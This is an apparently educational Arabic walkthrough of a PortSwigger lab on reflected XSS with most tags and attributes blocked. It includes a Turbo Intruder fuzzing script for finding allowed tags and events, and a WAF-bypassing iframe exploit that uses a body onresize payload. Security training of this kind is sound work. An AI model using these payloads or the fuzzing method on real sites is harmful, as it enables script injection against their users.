# [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

## **`الهدف`**
قم بتنفيذ هجوم `XSS` يتجاوز الـ `WAF` ويستدعي دالة `print()`.
## **`خطوات الحل`**
**`ملاحظة:`** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

عند محاولة حقن الأمر التالي في حقل البحث 
```html
<img src=1 onerror=print()>
```

سنجد أن الاستجابة بها رسالة `Tag is not allowed`.
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 20

"Tag is not allowed"
```
لذلك سنقوم بإستعمال `Turbo Intruder` باستخدام سكريبت `Python` التالي:
```python
def queueRequests(target, wordlists):
    # السماح بأكثر من اتصال متوازي لتسريع العملية
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,   
                           # (ثلاث اتصالات متوازية (يمكن زيادتها حسب الرغبة
                           requestsPerConnection=50, 
                           # عدد الطلبات المرسلة عبر الاتصال الواحد
                           pipeline=False,            
                           # تعطيل الـ pipelining تماماً
                           engine=Engine.THREADED
                           )

    # افتح الملف واقرأ السطور (الكلمات) الموجودة فيه
    # تنبيه: استبدل المسار التالي بالمسار الحقيقي للملف
    with open(r'C:\Users\test\Desktop\test.txt', 'r') as f:
        for line in f:
            # نأخذ الكلمة ونحذف أي مسافات أو سطور زائدة من أطرافها
            word = line.strip()
            
            # إذا كان السطر فارغاً، يتم تخطيه والانتقال للسطر التالي دون إرسال طلب
            if not word:
                continue

            # نُرسل القيمة المقروءة من الملف للجزء المُحدد في الـ Request
            engine.queue(target.req, word)

def handleResponse(req, interesting):
    # عرض كل النتائج في الجدول بدون أي فلترة لكي نتابع كل الطلبات
    table.add(req)
```
لتجربة حقن العديد من الـ `Payloads` في `requset` البحث، والحقن سيكون في كلمة البحث التي تلي `/?search=` في الطلب
```http
GET /?search=%3Cimg+src%3D1+onerror%3Dprint%28%29%3E HTTP/2
Host: 0af700b9045ec6e88068a8aa0059009f.web-security-academy.net
Cookie: session=pPkqQ5GYFAcKB5ke33nHhge719yV5xhE
```

أولًا سنقوم بحقن الـ `Tags` الموجود في الـ **[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)**، وسنستعمل الـ `Payload` التالي مع وضع ال `%s` الخاصة بـ `Turbo Intruder`
```Payload
?search=<%s>
```

وسنلاحظ أن `body` كانت استجابتها `Status Code 200` عكس معظم البقية فقد كانوا `Status Code 400`.

ثانيًا: سنقوم بحقن الـ `Events` الموجود في الـ **[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)**، وسنستعمل الـ `Payload` التالي مع وضع ال `%s` الخاصة بـ `Turbo Intruder`
```Payload
?search=<body%20%s=1>
```

وسنقوم باستخدام سكريبت `Python` التالي مع `Turbo Intruder`:
```python
def queueRequests(target, wordlists):
    # السماح بأكثر من اتصال متوازي لتسريع العملية
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,   
                           # (ثلاث اتصالات متوازية (يمكن زيادتها حسب الرغبة
                           requestsPerConnection=50, 
                           # عدد الطلبات المرسلة عبر الاتصال الواحد
                           pipeline=False,            
                           # تعطيل الـ pipelining تماماً
                           engine=Engine.THREADED
                           )

    # افتح الملف واقرأ السطور (الكلمات) الموجودة فيه
    # تنبيه: استبدل المسار التالي بالمسار الحقيقي للملف
    with open(r'C:\Users\test\Desktop\test.txt', 'r') as f:
        for line in f:
            # نأخذ الكلمة ونحذف أي مسافات أو سطور زائدة من أطرافها
            word = line.strip()
            
            # إذا كان السطر فارغاً، يتم تخطيه والانتقال للسطر التالي دون إرسال طلب
            if not word:
                continue

            # نُرسل القيمة المقروءة من الملف للجزء المُحدد في الـ Request
            engine.queue(target.req, word)

def handleResponse(req, interesting):
    # عرض كل النتائج في الجدول بدون أي فلترة لكي نتابع كل الطلبات
    table.add(req)
```

وسنلاحظ أن `onresize` كانت استجابتها `Status Code 200`.
لذلك سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
```html
<iframe src="https://0af700b9045ec6e88068a8aa0059009f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب. 

ولقد استعملنا هنا `Payload` التالي 
```Payload
"><body onresize=print()>
```
وسبب وجود `">` في البداية هو للهروب لأن الكود يتم طباعته داخل خاصية `Inside an Attribute` وليس `Between Tags`  مثل اللابين السابقين.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Reflected XSS into HTML context with nothing encoded](./Reflected-XSS-into-HTML-context-with-nothing-encoded.md)
